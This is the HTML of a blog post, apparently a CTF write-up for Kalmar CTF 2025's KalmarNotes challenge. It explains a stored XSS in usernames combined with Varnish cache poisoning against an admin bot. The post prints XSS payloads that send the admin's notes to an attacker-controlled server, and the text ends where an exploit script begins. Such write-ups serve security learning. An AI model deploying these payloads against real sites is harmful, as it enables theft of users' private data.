@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2599   Title: KalmarNotes (51 solves)Description: Every CTF needs a note taking challenge, here is ours.Attachment: kalmarnotes.zip  The challenge provided the full source c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)">
+<meta property="og:url" content="https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/index.html">
+<meta property="og:site_name" content="HyeonJi Son">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2599   Title: KalmarNotes (51 solves)Description: Every CTF needs a note taking challenge, here is ours.Attachment: kalmarnotes.zip  The challenge provided the full source c">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-03-09T23:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-10T23:42:14.778Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/250306-cloudgoat-scenario01-sns_secrets/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&text=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&is_video=false&description=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)&body=Check out this article: https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&name=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&t=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cache-Poisoning"><span class="toc-number">1.2.</span> <span class="toc-text">Cache Poisoning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-Summary"><span class="toc-number">2.</span> <span class="toc-text">Solution Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.</span> <span class="toc-text">Exploit Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.1.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-09T23:00:00.000Z" itemprop="datePublished">2025-03-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/Kalmar/">Kalmar</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>, <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/2599">https://ctftime.org/event/2599</a></li>
+</ul>
+<blockquote>
+<p>Title: KalmarNotes (51 solves)<br>Description: Every CTF needs a note taking challenge, here is ours.<br>Attachment: kalmarnotes.zip</p>
+</blockquote>
+<p>The challenge provided the full source code! I’ll introduce my approach to solve it. Let’s dive in together.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>The project structure of the challenge is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">src - templates</span><br><span class="line">                - base.html</span><br><span class="line">                - index.html</span><br><span class="line">                - login.html</span><br><span class="line">                - new_note.html</span><br><span class="line">                - notes.html</span><br><span class="line">                - register.html</span><br><span class="line">                - view_note_long.html</span><br><span class="line">                - view_note_short.html</span><br><span class="line">    - admin_bot.py</span><br><span class="line">    - app.py</span><br><span class="line">    - db.py</span><br><span class="line">decault.vcl</span><br><span class="line">docker-compose.yml</span><br><span class="line">Dockerfile</span><br><span class="line">requiirements.txt</span><br><span class="line">supervisord.conf</span><br></pre></td></tr></table></figure>
+
+<p>I first examined <code>admin_bot.py</code> because its name caught my attention. After reviewing the file, I suspected that this challenge was related to <code>XSS (Cross-Site Scripting)</code>. The final goal was to obtain the flag. So, the first step was to check where the flag was stored in the source code.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admin_pass = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">flag = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;default_flag&#x27;</span>)</span><br><span class="line">conn.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    INSERT OR IGNORE INTO users (username, password)</span></span><br><span class="line"><span class="string">    VALUES (?, ?)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, (<span class="string">&#x27;admin&#x27;</span>, admin_pass))</span><br><span class="line"></span><br><span class="line">random_large_id = random.randint(<span class="number">1</span>, <span class="number">100000000000</span>)</span><br><span class="line">conn.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    INSERT OR IGNORE INTO notes (id, user_id, title, content)</span></span><br><span class="line"><span class="string">    VALUES (?, 1, &#x27;Flag&#x27;, ?)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, (random_large_id, flag))</span><br></pre></td></tr></table></figure>
+
+<p>According to the database structure, the flag is stored in the <code>notes</code> table, and it was written there by the <code>admin</code>.</p>
+<p>This challenge includes several functionalities:</p>
+<ol>
+<li>Register &#x2F; Login</li>
+<li>Create a Note – After registering and logging in, users can create notes.</li>
+<li>Read Notes – Only the author of a note can access and read it.</li>
+<li>Notes can be viewed in two formats: short and long.</li>
+<li>Report a Note via <code>/api/report</code> API</li>
+</ol>
+<p>The most interesting functionality is the fifth one.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/report&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report_note</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    url = data.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    success = admin_bot.visit(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> success:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Report submitted successfully&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Failed to process report&#x27;</span>&#125;), <span class="number">500</span></span><br></pre></td></tr></table></figure>
+
+<p>The <code>report_note()</code> function handles POST requests to the <code>/api/report</code> endpoint. It accepts a JSON object containing a <code>url</code> and then calls the <code>visit()</code> method of <code>admin_bot</code>, passing <code>url</code> as an argument. If it’s successful, it returns a success message. Otherwise, it returns an error message with a 500 status code.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin_bot.py - AdminBot class</span></span><br><span class="line"><span class="comment"># A lot of codes have been omitted</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">    hostname = os.getenv(<span class="string">&#x27;HOSTNAME&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">    domain = <span class="string">f&#x27;http://localhost:80&#x27;</span> <span class="keyword">if</span> hostname == <span class="string">&#x27;localhost&#x27;</span> <span class="keyword">else</span> <span class="string">f&#x27;https://<span class="subst">&#123;hostname&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    password = os.getenv(<span class="string">&#x27;ADMIN_PASSWORD&#x27;</span>, <span class="string">&#x27;kalmar&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    self.driver.get(domain+<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    username_field = self.driver.find_element(By.NAME, <span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password_field = self.driver.find_element(By.NAME, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    username_field.send_keys(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">    password_field.send_keys(password)</span><br><span class="line">    password_field.submit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">self, note_url</span>):</span><br><span class="line">    self.login()</span><br><span class="line">    self.driver.get(note_url)</span><br></pre></td></tr></table></figure>
+
+<p>Inside the <code>AdminBot</code> class, the <code>visit()</code> function performs the following steps:</p>
+<ol>
+<li>Calls <code>self.login()</code> to log in as the admin.</li>
+<li>Navigates to the provided <code>note_url</code> using <code>self.driver.get(note_url)</code>.</li>
+</ol>
+<p>Since only the note’s author can access a note, only the admin can read the flag.</p>
+<p>I know that this type of code pattern is a characteristic of an XSS challenge. Then, Where is the XSS point?</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- view_note_long.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-header bg-dark text-white&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;mb-0&quot;</span>&gt;</span>&#123;&#123; note.title | safe &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span>&gt;</span>Written by &#123;&#123; username | safe &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-body&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span> <span class="attr">style</span>=<span class="string">&quot;white-space: pre-wrap; font-size: 1.1rem;&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123; note.content | safe &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;deleteNote(&#123;&#123; note.id | safe &#125;&#125;)&quot;</span>&gt;</span>Delete Note<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary&quot;</span>&gt;</span>Back to Notes<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>I checked for potential <code>XSS</code>.</p>
+<ul>
+<li><code>notes</code> are properly escaped when rendered, preventing XSS as follow codes.</li>
+<li>However, <code>usernames</code> are not sanitized, making them vulnerable to XSS.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># db.py</span></span><br><span class="line"><span class="comment"># If you try to read note and get note&#x27;s information...</span></span><br><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line">escape(data)</span><br></pre></td></tr></table></figure>
+
+<p>As a result, <code>XSS</code> can be triggered when accessing <code>/note/&lt;int:note_id&gt;/long</code>. However, this only leads to <code>self-XSS</code>, meaning it affects only me and does not help obtain the flag.</p>
+<p>Since only the author can access their own notes, reporting a note will not make the admin visit and trigger the <code>XSS</code> on my note. Let’s check this part in the code.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># db.py - get_note_by_id(self, note_id, user_id)</span></span><br><span class="line">cursor = db.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    SELECT id, title, content, user_id FROM notes WHERE id = ?</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, (note_id,))</span><br><span class="line">row = cursor.fetchone()</span><br><span class="line"><span class="keyword">if</span> row <span class="keyword">and</span> row[<span class="number">3</span>] == user_id:</span><br><span class="line">    note = &#123;<span class="string">&#x27;id&#x27;</span>: row[<span class="number">0</span>], <span class="string">&#x27;title&#x27;</span>: row[<span class="number">1</span>], <span class="string">&#x27;content&#x27;</span>: row[<span class="number">2</span>], <span class="string">&#x27;user_id&#x27;</span>: row[<span class="number">3</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cache-Poisoning"><a href="#Cache-Poisoning" class="headerlink" title="Cache Poisoning"></a>Cache Poisoning</h3><p>When read a <code>note</code>, the system verifies whether the person reading the note (the currently logged-in user) is the same as the person who created it. At this point, I noticed <code>default.vcl</code>, which is a configuration file for <code>Varnish</code>. <code>Varnish</code> is a proxy, similar to <code>Nginx</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">vcl 4.0;</span><br><span class="line"></span><br><span class="line">backend default &#123;</span><br><span class="line">    .host = &quot;127.0.0.1&quot;;</span><br><span class="line">    .port = &quot;3000&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_hash &#123;</span><br><span class="line">    hash_data(req.url);</span><br><span class="line">    if (req.url ~ &quot;\.(js|css|png|gif)$&quot;) &#123;</span><br><span class="line">        return (lookup);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.url ~ &quot;\.(js|css|png|gif)$&quot;) &#123;</span><br><span class="line">        set req.http.Cache-Control = &quot;max-age=10&quot;;</span><br><span class="line">        return (hash);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_backend_response &#123;</span><br><span class="line">    if (bereq.url ~ &quot;\.(js|css|png|gif)$&quot;) &#123;</span><br><span class="line">        unset beresp.http.Vary;</span><br><span class="line">        set beresp.ttl = 10s;</span><br><span class="line">        set beresp.http.Cache-Control = &quot;max-age=10&quot;;</span><br><span class="line">        unset beresp.http.Pragma;</span><br><span class="line">        unset beresp.http.Expires;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_deliver &#123;</span><br><span class="line">    if (obj.hits &gt; 0) &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;HIT&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;MISS&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    set resp.http.X-Cache-Hits = obj.hits;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This configures caching behaviour for a backend server running on <code>127.0.0.1:3000</code>. In <code>vcl_recv</code>, It checks if the request is for static assets shuch as <code>js</code>, <code>css</code>, <code>png</code>, or <code>gif</code>. If it’s for static assets, sets <code>Cache-Control: max-age=10</code> to cache the response for 10 seconds. And calls <code>hash</code>, which determines if the request should be served from the cache.</p>
+<p>The issue is in <code>vcl_hash</code>, <code>req.url</code> is used as the cache key and includes the query parameters. For example, if <code>req.url</code> is <code>https://callenge.com/note/1234/long.js</code>, it could be cached as if it were a static file. As a result, unintended pages might be cached.</p>
+<p>The strategy is to register an account with an <code>XSS</code> payload that will make the admin visit my web server, allowing me to extract the admin’s note containing the flag. Then, I create a new note and report it, ensuring that the admin reads the note. During this process, I need to obtain a <code>token</code> and the <code>note_id</code>. The details of these steps can be found in the exploit code.</p>
+<p>This is the example of the XSS payload to create an account.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/notes&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://[YOUR-SERVER]?a=&#x27;</span>+<span class="title function_">btoa</span>(x)))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/notes&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://[YOUR-SERVER]?a=&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(x)))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/notes&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">`https://[YOUR-SERVER]?note=<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(x)&#125;</span>`</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-Summary"><a href="#Solution-Summary" class="headerlink" title="Solution Summary"></a>Solution Summary</h2><ol>
+<li>Register with an XSS payload in the username – This payload will make the admin visit my server.</li>
+<li>Log in and obtain a token – Needed to interact with the API.</li>
+<li>Create a new note</li>
+<li>Extract the note_id – The created note must be reported to the admin.</li>
+<li>Poison the cache</li>
+<li>Report the note – This forces the admin to visit the poisoned page(&#x3D;created note), triggering the XSS.</li>
+</ol>
+<p>Once the XSS executes, it will send the admin’s note (containing the flag) to my server.</p>
+<h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, random</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;https://2466de6efa8df489e1ddb0695238c7ec-57648.inst6.chal-kalmarc.tf/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span 